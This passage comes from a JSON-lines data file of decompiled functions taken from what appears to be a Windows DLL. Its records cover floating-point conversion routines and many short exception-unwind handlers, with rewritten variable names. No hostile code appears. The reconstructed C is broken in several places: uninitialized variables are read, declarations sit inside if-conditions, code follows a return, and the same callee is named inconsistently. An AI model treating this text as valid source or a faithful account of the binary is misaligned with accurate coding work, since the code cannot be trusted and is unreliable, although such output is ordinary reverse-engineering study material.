(ushort)(SUB161(intermediateValues >> 0x1f, 0) & 1) << 3 |\n                                       (ushort)(SUB161(intermediateValues >> 0x27, 0) & 1) << 4 |\n                                       (ushort)(SUB161(intermediateValues >> 0x2f, 0) & 1) << 5 |\n                                       (ushort)(SUB161(intermediateValues >> 0x37, 0) & 1) << 6 |\n                                       (ushort)(SUB161(intermediateValues >> 0x3f, 0) & 1) << 7 |\n                                       (ushort)(SUB161(intermediateValues >> 0x47, 0) & 1) << 8 |\n                                       (ushort)(SUB161(intermediateValues >> 0x4f, 0) & 1) << 9 |\n                                       (ushort)(SUB161(intermediateValues >> 0x57, 0) & 1) << 10 |\n                                       (ushort)(SUB161(intermediateValues >> 0x5f, 0) & 1) << 0xb |\n                                       (ushort)(SUB161(intermediateValues >> 0x67, 0) & 1) << 0xc |\n                                       (ushort)(SUB161(intermediateValues >> 0x6f, 0) & 1) << 0xd |\n                                       (ushort)(SUB161(intermediateValues >> 0x77, 0) & 1) << 0xe |\n                                       (ushort)(intermediateValues[0xf] >> 7) << 0xf) & -1 << ((byte)inputArray & 0xf);\n                \n                if (byteValue != 0) break;\n                \n                charPointer += 0x10;\n            }\n            loopIndex = 0; \n            \n            if (byteValue != 0) {\n                \n                for (; (byteValue >> loopIndex & 1) == 0; loopIndex++) {}\n            }\n            \n            return (undefined (*) [16])(charPointer + loopIndex);\n        } else {\n            foundElementPointer = (undefined (*) [16])0x0; \n            uint lowerBits = (uint)inputArray & 0xf; \n            while (lowerBits != 0) {\n                \n                if ((byte)(*inputArray)[0] == byteValue) {\n                    foundElementPointer = inputArray; \n                }\n                \n                if ((byte)(*inputArray)[0] == 0) {\n                    return foundElementPointer;\n                }\n                \n                inputArray = (undefined (*) [16])(*inputArray + 1);\n                lowerBits = (uint)inputArray & 0xf; \n            }\n            do {\n                \n                loopIndex = pcmpistri(ZEXT416(byteValue), *inputArray, 0x40);\n                inputArray++; \n            } while (inputArray != (undefined (*) [16])0x0); \n            return foundElementPointer; \n        }\n    }\n    loopIndex = -1; \n    do {\n        \n        if (loopIndex == 0) break;\n        loopIndex++; \n        \n        inputArray = (undefined (*) [16])(*inputArray + 1);\n    } while (*inputArray != '\\0'); \n    \n    return (undefined (*) [16])((char *)inputArray + 1);\n}"}
{"Function Name": "FUN_10037a8e", "Address": "10037a8e", "Source Code": "ulonglong FUN_10037a8e(void)\n{\n    double inputDoubleValue; \n    ushort fpuControlWord; \n    float inputFloatValue; \n    ulonglong inputUlonglongValue; \n    ulonglong result = 0; \n    longlong shiftAmount; \n    ulonglong calculatedValue; \n    undefined intermediateValues1[16]; \n    undefined intermediateValues2[16]; \n    \n    \n    if (((0x7f7fffff < ((uint)inputFloatValue & 0x7fffffff)) || \n        (inputDoubleValue = (double)inputFloatValue, DAT_100488c8 <= inputDoubleValue)) || \n        (inputDoubleValue < DAT_100488c0)) { \n        FUN_10037c0d(3, 8); \n        return 0x8000000000000000; \n    }\n    \n    \n    intermediateValues1._0_8_ = (double)((ulonglong)inputDoubleValue & 0x7fffffffffffffff); \n    intermediateValues1._8_8_ = inputUlonglongValue & 0x7fffffffffffffff; \n    \n    \n    if (((intermediateValues1._0_8_ <= DAT_100488e0) && (intermediateValues1._0_8_ != 0.0)) && ((fpuControlWord & 0x10) == 0)) {\n        FUN_10037c0d(3, 2); \n        return 0x8000000000000000; \n    }\n    \n    \n    if (intermediateValues1._0_8_ != 0.0) {\n        intermediateValues2._0_8_ = DAT_100488a8; \n        intermediateValues2._8_8_ = 0; \n        \n        intermediateValues2 = intermediateValues1 & (undefined[16]){0, 0, 0, 0, 0, 0, 0, 0} | intermediateValues2;\n        shiftAmount = (ulonglong)DAT_10048900 - ((ulonglong)intermediateValues1._0_8_ >> 0x34); \n        calculatedValue = intermediateValues2._0_8_ >> shiftAmount; \n        int signFlag = -(uint)((int)DAT_10048900 < (int)(uint)((ulonglong)((longlong)inputDoubleValue << 1) >> 0x35)); \n        result = CONCAT44(signFlag, signFlag); \n        \n        result = ~result & calculatedValue | intermediateValues2._0_8_ << ((ulonglong)intermediateValues1._0_8_ >> 0x34) - (ulonglong)DAT_10048900 & result;\n        result = ~-(ulonglong)(inputDoubleValue == intermediateValues1._0_8_) & -result | result & -(ulonglong)(inputDoubleValue == intermediateValues1._0_8_);\n        \n        \n        if ((0 < (int)shiftAmount) && (SUB164(intermediateValues2 ^ (undefined[16]){calculatedValue << shiftAmount, (intermediateValues2._8_8_ >> shiftAmount) << -(intermediateValues1._8_8_ >> 0x34)}, 0) | SUB164(intermediateValues2 ^ (undefined[16]){calculatedValue << shiftAmount, (intermediateValues2._8_8_ >> shiftAmount) << -(intermediateValues1._8_8_ >> 0x34)}, 4)) != 0) {\n            FUN_10037c0d(3, 0x10); \n        }\n    }\n    \n    return result; \n}"}
{"Function Name": "FUN_10037b39", "Address": "10037b39", "Source Code": "ulonglong __fastcall FUN_10037b39(undefined4 input_param)\n{\n    double double_value; \n    ulonglong result; \n    undefined byte_array [16]; \n    longlong calculation_value; \n    ulonglong intermediate_result; \n    result = 0; \n    double_value = xmm_input._0_8_; \n    if (double_value != 0.0) { \n        byte_array._0_8_ = data_value_1; \n        byte_array._8_8_ = 0; \n        calculation_value = (ulonglong)data_value_2 - ((ulonglong)double_value >> 0x34); \n        intermediate_result = (xmm_input & (undefined[16]){0, 0, 0, 0, 0, 0, 0, DAT_100488a0})._0_8_ >> calculation_value; \n        result = ~(-(uint)((int)data_value_2 < (int)(xmm_input._4_4_ >> 0x14))) & intermediate_result | \n                byte_array._0_8_ << ((ulonglong)double_value >> 0x34) - (ulonglong)data_value_2 & result; \n        result = ~-(ulonglong)(xmm_comparison == double_value) & -result | result & -(ulonglong)(xmm_comparison == double_value); \n        if ((0 < (int)calculation_value) && \n            (undefined shifted_array [16] = {0, 0, 0, 0, intermediate_result << calculation_value, (byte_array._8_8_ >> calculation_value) << -(xmm_input._8_8_ >> 0x34)}, \n            (SUB164(byte_array ^ shifted_array,0) | SUB164(byte_array ^ shifted_array,4)) != 0)) { \n            FUN_10037c0d(input_param,0x10); \n        }\n    }\n    return result; \n}"}
{"Function Name": "FUN_10037c0d", "Address": "10037c0d", "Source Code": "void __fastcall FUN_10037c0d(undefined4 input_param_1, uint input_param_2)\n{\n    ushort fpu_control_word; \n    undefined8 xmm0_value;    \n    \n    \n    if ((input_param_2 == 8) || ((*(byte *)((int)&DAT_100488e8 + input_param_2 + 7) & (byte)fpu_control_word) == 0)) {\n        \n        \n        __except1(input_param_2, 0, xmm0_value, (double)xmm0_value, (uint)fpu_control_word);\n    }\n}"}
{"Function Name": "FUN_10037c51", "Address": "10037c51", "Source Code": "uint FUN_10037c51(void) \n{\n    double inputDouble; \n    ulonglong inputUlonglong; \n    uint result = 0; \n    longlong shiftValue; \n    ulonglong combinedValue; \n    \n    if (((((uint)((ulonglong)inputDouble >> 0x20) & 0x7fffffff) < 0x7ff00000) &&\n        (inputDouble < DAT_100488c8)) && (DAT_100488c0 <= inputDouble)) {\n        \n        \n        ulonglong absoluteInput = (ulonglong)inputDouble & 0x7fffffffffffffff;\n        ulonglong combinedConstants = DAT_100488a0 | (DAT_100488a8 & 0x7fffffffffffffff);\n        \n        \n        if (absoluteInput != 0.0) {\n            \n            shiftValue = (ulonglong)DAT_10048900 - (absoluteInput >> 0x34);\n            combinedValue = combinedConstants >> shiftValue; \n            \n            \n            result = -(uint)((int)DAT_10048900 < (int)(uint)(absoluteInput >> 0x34));\n            result = ~result & (uint)combinedValue |\n                     (uint)(combinedConstants << ((ulonglong)absoluteInput >> 0x34) - (ulonglong)DAT_10048900) & result;\n            result = ~-(uint)(inputDouble == absoluteInput) & -result |\n                     result & -(uint)(inputDouble == absoluteInput);\n            \n            \n            if ((0 < (int)shiftValue) &&\n                (ulonglong shiftedValue = combinedValue << shiftValue,\n                (combinedConstants >> shiftValue) << -(absoluteInput >> 0x34) ^ shiftedValue != 0)) {\n                FUN_10037c0d(1, 0x10); \n            }\n        }\n    }\n    FUN_10037c0d(1, 8); \n    return result; \n}"}
{"Function Name": "FUN_10037c6f", "Address": "10037c6f", "Source Code": "ulonglong FUN_10037c6f(void) \n{\n    int counter = 5; \n    double resultValue; \n    ulonglong finalResult; \n    \n    if (((uint)((ulonglong)in_XMM0_Qa >> 0x20) & 0x7fffffff) < 0x7ff00000) {\n        \n        undefined dataArray[16] = { (double)((ulonglong)in_XMM0_Qa & 0x7fffffffffffffff), in_XMM0_Qb & 0x7fffffffffffffff };\n        double dataValue = DAT_100488c8; \n        \n        if (DAT_100488d8 < dataArray._0_8_) {\n            FUN_10037c0d(5, 1); \n            counter = extraout_ECX_00; \n        }\n        resultValue = dataArray._0_8_; \n        \n        if (resultValue < DAT_100488e0) {\n            if (resultValue == 0.0) { \n                finalResult = 0; \n            } else {\n                \n                undefined tempArray1[16] = { DAT_100488a8, 0 };\n                undefined tempArray2[16] = { DAT_100488a0, 0 };\n                \n                tempArray1 = dataArray & tempArray2 | tempArray1;\n                longlong calculationValue = (ulonglong)DAT_10048900 - ((ulonglong)resultValue >> 0x34); \n                ulonglong shiftedValue = tempArray1._0_8_ >> calculationValue; \n                int comparisonResult = -(uint)((int)DAT_10048900 < (int)(dataArray._4_4_ >> 0x14)); \n                \n                finalResult = ~CONCAT44(comparisonResult, comparisonResult) & shiftedValue |\n                          tempArray1._0_8_ << ((ulonglong)resultValue >> 0x34) - (ulonglong)DAT_10048900 & ~CONCAT44(comparisonResult, comparisonResult);\n                \n                finalResult = ~-(ulonglong)(in_XMM0_Qa == resultValue) & -finalResult | finalResult & -(ulonglong)(in_XMM0_Qa == resultValue);\n                \n                if ((0 < (int)calculationValue) && (undefined tempArray3[16] = { shiftedValue << calculationValue, (tempArray1._8_8_ >> calculationValue) << -(dataArray._8_8_ >> 0x34) },\n                    (SUB164(tempArray1 ^ tempArray3, 0) | SUB164(tempArray1 ^ tempArray3, 4)) != 0)) {\n                    FUN_10037c0d(counter, 0x10); \n                }\n            }\n            return finalResult; \n        }\n    }\n    \n    FUN_10037c0d(counter, 2);\n    FUN_10037c0d(extraout_ECX_01, 0x10); \n    return FUN_10037b39(extraout_ECX_02); \n    \n    resultValue = in_XMM0_Qa; \n    \n    if ((counter == 4) && (DAT_100488c8 <= in_XMM0_Qa)) {\n        resultValue = in_XMM0_Qa - DAT_100488c8; \n    }\n    \n    if ((int)((ulonglong)((longlong)resultValue << 0x23) >> 0x20) != 0) {\n        FUN_10037c0d(counter, 0x10); \n        counter = extraout_ECX_03; \n    }\n    \n    if ((in_XMM0_Qa < DAT_100488c8) && (DAT_100488c0 <= in_XMM0_Qa)) {\n        return FUN_10037b39(counter); \n    }\n    FUN_10037c0d(counter, 8); \n    return 0x8000000000000000; \n}"}
{"Function Name": "Unwind@10037df0", "Address": "10037df0", "Source Code": "void unwindFunction(void) \n{\n    \n    functionCall(*(int **)(*(int *)0xFFFFFFF0));\n}"}
{"Function Name": "Unwind@10037df8", "Address": "10037df8", "Source Code": "void Unwind_10037df8(void)\n{\n    \n    \n    function_call((void **)(*(int *)(base_pointer - 0x10) + 4));\n}"}
{"Function Name": "Unwind@10037e03", "Address": "10037e03", "Source Code": "void Unwind_10037e03(void)\n{\n    \n    \n    \n    \n    \n    function_pointer((void **)(*(int *)(*(int *)(base_pointer + -0x10)) + 0xc));\n}"}
{"Function Name": "Unwind@10037e0e", "Address": "10037e0e", "Source Code": "void Unwind_10037e0e(void)\n{\n    \n    function_call((void **)(*(int *)(*(int *)((char *)&base_pointer - 0x10)) + 0x14));\n}"}
{"Function Name": "Unwind@10037e19", "Address": "10037e19", "Source Code": "void Unwind_10037e19(void)\n{\n    \n    \n    \n    \n    function_call((void **)(*(int *)(*(int *)(base_pointer + -0x10)) + 0x1c));\n}"}
{"Function Name": "Unwind@10037e24", "Address": "10037e24", "Source Code": "void Unwind_10037e24(void)\n{\n    \n    function_call((void **)(*(int *)(*(int *)(base_pointer + -0x10)) + 0x24));\n}"}
{"Function Name": "Unwind@10037e2f", "Address": "10037e2f", "Source Code": "void Unwind_10037e2f(void)\n{\n    \n    \n    function_call((void **)(*(int *)(base_pointer - 0x10) + 0x2c));\n}"}
{"Function Name": "Unwind@10037ea0", "Address": "10037ea0", "Source Code": "void Unwind_10037ea0(void)\n{\n    \n    \n    FUN_10002590((void **)(base_pointer - 0x40));\n}"}
{"Function Name": "Unwind@10037ea8", "Address": "10037ea8", "Source Code": "void Unwind_10037ea8(void) \n{\n    FUN_10002590((void **)(base_pointer - 0x5c)); \n}"}
{"Function Name": "Unwind@10037ee0", "Address": "10037ee0", "Source Code": "void Unwind_10037ee0(void) \n{\n    \n    FUN_10002590((void **)(base_pointer - 0x28));\n}"}
{"Function Name": "Unwind@10037f10", "Address": "10037f10", "Source Code": "void Unwind_10037f10(void) \n{\n    FUN_10002490((void **)(base_pointer - 0x1c)); \n}"}
{"Function Name": "Unwind@10037f40", "Address": "10037f40", "Source Code": "void Unwind_10037f40(void) \n{\n    \n    \n    FUN_10003470((int **)(unaff_EBP - 0x2c));\n}"}
{"Function Name": "Unwind@10037f48", "Address": "10037f48", "Source Code": "void Unwind_10037f48(void)\n{\n    \n    \n    FUN_10002920((int **)(base_pointer - 0x2c));\n}"}
{"Function Name": "Unwind@10037f50", "Address": "10037f50", "Source Code": "void unwindFunction(void) \n{\n    functionCall(-0x20); \n    return; \n}"}
{"Function Name": "Unwind@10037f80", "Address": "10037f80", "Source Code": "void Unwind_10037f80(void)\n{\n    \n    \n    \n    function_call((int **)(base_pointer - 0x2c));\n}"}
{"Function Name": "Unwind@10037f88", "Address": "10037f88", "Source Code": "void Unwind_10037f88(void)\n{\n    \n    \n    function_call((int **)(base_pointer - 0x2c));\n}"}
{"Function Name": "Unwind@10037f90", "Address": "10037f90", "Source Code": "void unwindFunction(void) \n{\n    functionCall(-0x24); \n}"}
{"Function Name": "Unwind@10037fe0", "Address": "10037fe0", "Source Code": "void Unwind_10037fe0(void)\n{\n    \n    \n    function_pointer(*(int ***)(&base_pointer - 0x10));\n}"}
{"Function Name": "Unwind@10038010", "Address": "10038010", "Source Code": "void Unwind_10038010(void)\n{\n    \n    \n    function_call((void **)(base_pointer - 0x30));\n}"}
{"Function Name": "Unwind@10038040", "Address": "10038040", "Source Code": "void unwindFunction(void) \n{\n    callFunction(-0x3c); \n}"}
{"Function Name": "Unwind@10038048", "Address": "10038048", "Source Code": "void Unwind_10038048(void)\n{\n    \n    FUN_10002590((void **)(base_pointer - 0x28));\n}"}
{"Function Name": "Unwind@10038080", "Address": "10038080", "Source Code": "void unwindFunction(void) \n{\n    callFunction(-0x4c); \n}"}
{"Function Name": "Unwind@10038088", "Address": "10038088", "Source Code": "void unwindFunction(void)\n{\n    \n    functionCall((void **)(basePointer - 0x28));\n}"}
{"Function Name": "Unwind@10038090", "Address": "10038090", "Source Code": "void unwindFunction(void) \n{\n    callFunction(-0x4c); \n}"}
{"Function Name": "Unwind@10038098", "Address": "10038098", "Source Code": "void Unwind_10038098(void)\n{\n    \n    \n    \n    function_pointer((void **)(base_pointer - 0x40));\n}"}
{"Function Name": "Unwind@100380d0", "Address": "100380d0", "Source Code": "void unwindFunction(void) \n{\n    functionCall(-0x54); \n}"}
{"Function Name": "Unwind@100380d8", "Address": "100380d8", "Source Code": "void Unwind_100380d8(void)\n{\n    \n    \n    function_call((void **)(base_pointer - 0x2c));\n}"}
{"Function Name": "Unwind@100380e0", "Address": "100380e0", "Source Code": "void unwindFunction(void) \n{\n    functionCall(-0x54); \n}"}
{"Function Name": "Unwind@100380e8", "Address": "100380e8", "Source Code": "void Unwind_100380e8(void)\n{\n    \n    function_call((void **)(base_pointer - 0x44));\n}"}
{"Function Name": "Unwind@10038120", "Address": "10038120", "Source Code": "void Unwind_10038120(void) \n{\n    \n    \n    function_call((int **)(base_pointer - 0x18));\n}"}
{"Function Name": "Unwind@10038170", "Address": "10038170", "Source Code": "void Unwind_10038170(void) \n{\n    FUN_10014d7c((int *)(unaff_EBP - 0x20)); \n}"}
{"Function Name": "Unwind@10038178", "Address": "10038178", "Source Code": "void Unwind_10038178(void)\n{\n    \n    \n    FUN_10013ceb(*(void **)(base_pointer - 0x24));\n}"}
{"Function Name": "Unwind@10038187", "Address": "10038187", "Source Code": "void Unwind_10038187(void)\n{\n    \n    \n    function_call((int *)(base_pointer - 0x18));\n}"}
{"Function Name": "Unwind@100381c0", "Address": "100381c0", "Source Code": "void Unwind_100381c0(void)\n{\n    \n    \n    function_call((int **)(base_pointer - 0x20));\n}"}
{"Function Name": "Unwind@100381c8", "Address": "100381c8", "Source Code": "void Unwind_100381c8(void)\n{\n    \n    \n    \n    FUN_10002920((int **)(stack_frame_pointer - 0x20));\n}"}
{"Function Name": "Unwind@100381f0", "Address": "100381f0", "Source Code": "void unwindFunction(void) \n{\n    functionCall(-0x14); \n}"}
{"Function Name": "Unwind@10038220", "Address": "10038220", "Source Code": "void unwind_function(void) \n{\n    function_call((int *)(base_pointer - 0x1c)); \n}"}
{"Function Name": "Unwind@10038228", "Address": "10038228", "Source Code": "void unwindFunction(void)\n{\n    \n    \n    processFunction(*(void **)(*(int *)0xFFFFFFEC));\n}"}
{"Function Name": "Unwind@10038237", "Address": "10038237", "Source Code": "void unwindFunction(void) \n{\n    functionCall((int *)(basePointer - 0x18)); \n}"}
{"Function Name": "Unwind@10038270", "Address": "10038270", "Source Code": "void Unwind_10038270(void) \n{\n    function_call((int *)(base_pointer - 0x1c)); \n}"}
{"Function Name": "Unwind@10038278", "Address": "10038278", "Source Code": "void unwindFunction(void) \n{\n    \n    functionCall(*(void **)(*(int *)0xFFFFFFEC));\n}"}
{"Function Name": "Unwind@10038287", "Address": "10038287", "Source Code": "void Unwind_10038287(void)\n{\n    \n    if ((*(uint *)(base_pointer - 0x20) & 1) != 0) {\n        \n        *(uint *)(base_pointer - 0x20) &= 0xfffffffe;\n        \n        function_call((int *)(base_pointer - 0x54));\n    }\n}"}
{"Function Name": "Unwind@100382a0", "Address": "100382a0", "Source Code": "void Unwind_100382a0(void)\n{\n    \n    \n    \n    FUN_100019c0(*(undefined4 **)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@100382a8", "Address": "100382a8", "Source Code": "void unwindFunction(void) \n{\n    functionCall((int *)(basePointer - 0x18)); \n}"}
{"Function Name": "Unwind@100382e0", "Address": "100382e0", "Source Code": "void Unwind_100382e0(void) \n{\n    \n    \n    FUN_10003470((int **)(base_pointer - 0x20));\n}"}
{"Function Name": "Unwind@100382e8", "Address": "100382e8", "Source Code": "void Unwind_100382e8(void)\n{\n    \n    \n    FUN_10002920((int **)(base_pointer - 0x20));\n}"}
{"Function Name": "Unwind@10038310", "Address": "10038310", "Source Code": "void unwindFunction(void) \n{\n    callFunction(-0x18); \n    return; \n}"}
{"Function Name": "Unwind@100383b0", "Address": "100383b0", "Source Code": "void unwindFunction(void)\n{\n    \n    \n    functionToCall(*(void **)(basePointer - 0x10));\n}"}
{"Function Name": "Unwind@100383e0", "Address": "100383e0", "Source Code": "void Unwind_100383e0(void) \n{\n    \n    \n    \n    callFunction(*(void **)(*(int *)0 + 8));\n}"}
{"Function Name": "Unwind@10038410", "Address": "10038410", "Source Code": "void Unwind_10038410(void)\n{\n    \n    \n    FUN_10008170((VARIANTARG *)(unaff_EBP - 0x24));\n}"}
{"Function Name": "Unwind@10038440", "Address": "10038440", "Source Code": "void Unwind_10038440(void) \n{\n    FUN_1000b440((int **)(base_pointer - 0x18)); \n}"}
{"Function Name": "Unwind@10038448", "Address": "10038448", "Source Code": "void Unwind_10038448(void) \n{\n    \n    \n    FUN_1000b440((int **)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@10038450", "Address": "10038450", "Source Code": "void Unwind_10038450(void) \n{\n    \n    \n    function_call((undefined4 *)(base_pointer - 0x3c));\n}"}
{"Function Name": "Unwind@10038458", "Address": "10038458", "Source Code": "void Unwind_10038458(void) \n{\n    \n    \n    FUN_10008170((VARIANTARG *)(unaff_EBP - 0x58));\n}"}
{"Function Name": "Unwind@10038460", "Address": "10038460", "Source Code": "void Unwind_10038460(void)\n{\n    \n    \n    function_call((undefined4 *)(base_pointer - 0x3c));\n}"}
{"Function Name": "Unwind@10038468", "Address": "10038468", "Source Code": "void Unwind_10038468(void) \n{\n    \n    FUN_10007e90((undefined4 *)(unaff_EBP - 0x3c)); \n}"}
{"Function Name": "Unwind@10038470", "Address": "10038470", "Source Code": "void Unwind_10038470(void) \n{\n    \n    \n    FUN_10008170((VARIANTARG *)(unaff_EBP - 0x58));\n}"}
{"Function Name": "Unwind@10038478", "Address": "10038478", "Source Code": "void Unwind_10038478(void)\n{\n    \n    \n    callFunction((undefined4 *)(basePointer - 0x3c));\n}"}
{"Function Name": "Unwind@100384b0", "Address": "100384b0", "Source Code": "void Unwind_100384b0(void)\n{\n    \n    \n    function_call((int **)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@100384b8", "Address": "100384b8", "Source Code": "void Unwind_100384b8(void)\n{\n    \n    \n    call_function((BSTR *)(base_pointer - 0x1c));\n}"}
{"Function Name": "Unwind@100384c0", "Address": "100384c0", "Source Code": "void unwindFunction(void)\n{\n    \n    \n    functionPointer((void **)(basePointer - 0x4c));\n}"}
{"Function Name": "Unwind@100384c8", "Address": "100384c8", "Source Code": "void Unwind_100384c8(void)\n{\n    \n    \n    function_call((int **)(base_pointer - 0x18));\n}"}
{"Function Name": "Unwind@10038500", "Address": "10038500", "Source Code": "void unwindFunction(void)\n{\n    \n    \n    functionPointer((int **)(basePointer - 0x14));\n}"}
{"Function Name": "Unwind@10038508", "Address": "10038508", "Source Code": "void unwindFunction(void) \n{\n    callFunction((BSTR *)(basePointer - 0x1c)); \n}"}
{"Function Name": "Unwind@10038510", "Address": "10038510", "Source Code": "void unwindFunction(void) \n{\n    callFunction(-0x2c); \n    return; \n}"}
{"Function Name": "Unwind@10038518", "Address": "10038518", "Source Code": "void Unwind_10038518(void) \n{\n    \n    \n    functionCall((int **)(basePointer - 0x18));\n}"}
{"Function Name": "Unwind@10038550", "Address": "10038550", "Source Code": "void Unwind_10038550(void)\n{\n    \n    \n    function_call((int **)(base_pointer - 0x24));\n}"}
{"Function Name": "Unwind@10038558", "Address": "10038558", "Source Code": "void unwind_function(void) \n{\n    \n    \n    function_call((int **)(base_pointer - 0x20));\n}"}
{"Function Name": "Unwind@10038560", "Address": "10038560", "Source Code": "void unwindFunction(void) \n{\n    processBSTR((BSTR *)(basePointer - 0x14)); \n}"}
{"Function Name": "Unwind@10038568", "Address": "10038568", "Source Code": "void unwindFunction(void) \n{\n    \n    \n    \n    callFunction((undefined4 *)(basePointer - 0x1c));\n}"}
{"Function Name": "Unwind@10038570", "Address": "10038570", "Source Code": "void unwindFunction(void) \n{\n    callFunction((VARIANTARG *)(-0x38)); \n}"}
{"Function Name": "Unwind@10038578", "Address": "10038578", "Source Code": "void Unwind_10038578(void)\n{\n    \n    \n    function_call((undefined4 *)(base_pointer - 0x58));\n}"}
{"Function Name": "Unwind@10038580", "Address": "10038580", "Source Code": "void Unwind_10038580(void)\n{\n    \n    \n    function_pointer((int **)(base_pointer - 0x18));\n}"}
{"Function Name": "Unwind@10038588", "Address": "10038588", "Source Code": "void Unwind_10038588(void) \n{\n    \n    \n    call_function((BSTR *)(base_pointer - 0x1c));\n}"}
{"Function Name": "Unwind@10038590", "Address": "10038590", "Source Code": "void Unwind_10038590(void)\n{\n    \n    \n    function_pointer((int **)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@100385c0", "Address": "100385c0", "Source Code": "void Unwind_100385c0(void)\n{\n    \n    \n    function_pointer((int **)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@100385c8", "Address": "100385c8", "Source Code": "void Unwind_100385c8(void)\n{\n    \n    \n    FUN_10007d30((BSTR *)(base_pointer - 0x1c));\n}"}
{"Function Name": "Unwind@100385d0", "Address": "100385d0", "Source Code": "void Unwind_100385d0(void) \n{\n    FUN_10009410((void **)(base_pointer - 0x58)); \n}"}
{"Function Name": "Unwind@100385d8", "Address": "100385d8", "Source Code": "void Unwind_100385d8(void) \n{\n    \n    FUN_10009470(*(void ***)(&unaff_EBP - 0x5c)); \n}"}
{"Function Name": "Unwind@100385e0", "Address": "100385e0", "Source Code": "void unwindFunction(void)\n{\n    \n    \n    functionPointer((int **)(basePointer - 0x18));\n}"}
{"Function Name": "Unwind@10038610", "Address": "10038610", "Source Code": "void Unwind_10038610(void)\n{\n    \n    \n    function_pointer((int **)(base_pointer - 0x24));\n}"}
{"Function Name": "Unwind@10038618", "Address": "10038618", "Source Code": "void Unwind_10038618(void) \n{\n    \n    \n    FUN_1000b440((int **)(unaff_EBP - 0x20));\n}"}
{"Function Name": "Unwind@10038620", "Address": "10038620", "Source Code": "void Unwind_10038620(void) \n{\n    call_function((BSTR *)(base_pointer - 0x1c)); \n}"}
{"Function Name": "Unwind@10038628", "Address": "10038628", "Source Code": "void Unwind_10038628(void)\n{\n    \n    \n    function_call((undefined4 *)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@10038630", "Address": "10038630", "Source Code": "void Unwind_10038630(void) \n{\n    \n    \n    FUN_10008170((VARIANTARG *)(unaff_EBP - 0x38));\n}"}
{"Function Name": "Unwind@10038638", "Address": "10038638", "Source Code": "void Unwind_10038638(void) \n{\n    \n    \n    FUN_10007e90((undefined4 *)(base_pointer - 0xb8));\n}"}
{"Function Name": "Unwind@10038643", "Address": "10038643", "Source Code": "void Unwind_10038643(void)\n{\n    \n    \n    \n    \n    function_call((undefined4 *)(base_pointer - 0xd8));\n}"}
{"Function Name": "Unwind@1003864e", "Address": "1003864e", "Source Code": "void unwindFunction(void) \n{\n    \n    \n    functionPointer((int **)(basePointer - 0x18));\n}"}
{"Function Name": "Unwind@10038656", "Address": "10038656", "Source Code": "void Unwind_10038656(void) \n{\n    \n    \n    FUN_10007d30((BSTR *)(unaff_EBP - 0x1c));\n}"}
{"Function Name": "Unwind@1003865e", "Address": "1003865e", "Source Code": "void Unwind_1003865e(void) \n{\n    \n    FUN_10009f90((void **)(base_pointer - 0x90));\n}"}
{"Function Name": "Unwind@10038669", "Address": "10038669", "Source Code": "void unwindFunction(void) \n{\n    functionCall(*(void ***)(-0xa8)); \n}"}
{"Function Name": "Unwind@10038674", "Address": "10038674", "Source Code": "void Unwind_10038674(void)\n{\n    \n    function_call((void **)(*(int *)(base_pointer - 0xa8) + 0x18));\n}"}
{"Function Name": "Unwind@10038682", "Address": "10038682", "Source Code": "void Unwind_10038682(void) \n{\n    FUN_1000b440((int **)(unaff_EBP - 0x14)); \n}"}
{"Function Name": "Unwind@100386c0", "Address": "100386c0", "Source Code": "void Unwind_100386c0(void)\n{\n    \n    \n    functionCall((int **)(basePointer - 0x1c));\n}"}
{"Function Name": "Unwind@100386c8", "Address": "100386c8", "Source Code": "void Unwind_100386c8(void)\n{\n    \n    \n    function_call((int **)(base_pointer - 0x18));\n}"}
{"Function Name": "Unwind@100386d0", "Address": "100386d0", "Source Code": "void Unwind_100386d0(void)\n{\n    \n    \n    FUN_10007d30((BSTR *)(base_pointer - 0x20));\n}"}
{"Function Name": "Unwind@100386d8", "Address": "100386d8", "Source Code": "void Unwind_100386d8(void)\n{\n    \n    \n    function_pointer((undefined4 *)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@100386e0", "Address": "100386e0", "Source Code": "void Unwind_100386e0(void)\n{\n    \n    \n    callFunction((VARIANTARG *)(basePointer - 0x38));\n}"}
{"Function Name": "Unwind@100386e8", "Address": "100386e8", "Source Code": "void Unwind_100386e8(void) \n{\n    \n    \n    FUN_10007e90((undefined4 *)(base_pointer - 0x5c));\n}"}
{"Function Name": "Unwind@100386f0", "Address": "100386f0", "Source Code": "void Unwind_100386f0(void)\n{\n    \n    \n    \n    callFunction((undefined4 *)(basePointer - 100));\n}"}
{"Function Name": "Unwind@100386f8", "Address": "100386f8", "Source Code": "void Unwind_100386f8(void) \n{\n    \n    FUN_10007e90((undefined4 *)(unaff_EBP - 0x6c)); \n}"}
{"Function Name": "Unwind@10038700", "Address": "10038700", "Source Code": "void Unwind_10038700(void) \n{\n    \n    \n    function_call((undefined4 *)(base_pointer - 0x74));\n}"}
{"Function Name": "Unwind@10038708", "Address": "10038708", "Source Code": "void Unwind_10038708(void)\n{\n    \n    \n    callFunction((undefined4 *)(basePointer - 0x7c));\n}"}
{"Function Name": "Unwind@10038710", "Address": "10038710", "Source Code": "void Unwind_10038710(void) \n{\n    \n    FUN_10007e90((undefined4 *)(base_pointer - 0x84)); \n}"}
{"Function Name": "Unwind@10038750", "Address": "10038750", "Source Code": "void Unwind_10038750(void)\n{\n    \n    \n    function_call((int **)(base_pointer - 0x18));\n}"}
{"Function Name": "Unwind@10038758", "Address": "10038758", "Source Code": "void unwind_function(void) \n{\n    \n    \n    process_pointer((int **)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@10038760", "Address": "10038760", "Source Code": "void Unwind_10038760(void) \n{\n    \n    \n    FUN_10007d30((BSTR *)(base_pointer - 0x20));\n}"}
{"Function Name": "Unwind@10038768", "Address": "10038768", "Source Code": "void Unwind_10038768(void)\n{\n    \n    \n    function_pointer((undefined4 *)(base_pointer - 0x1c));\n}"}
{"Function Name": "Unwind@10038770", "Address": "10038770", "Source Code": "void Unwind_10038770(void) \n{\n    \n    \n    FUN_10008170((VARIANTARG *)(unaff_EBP - 0x38));\n}"}
{"Function Name": "Unwind@10038778", "Address": "10038778", "Source Code": "void Unwind_10038778(void)\n{\n    \n    \n    callFunction((undefined4 *)(basePointer - 0x58));\n}"}
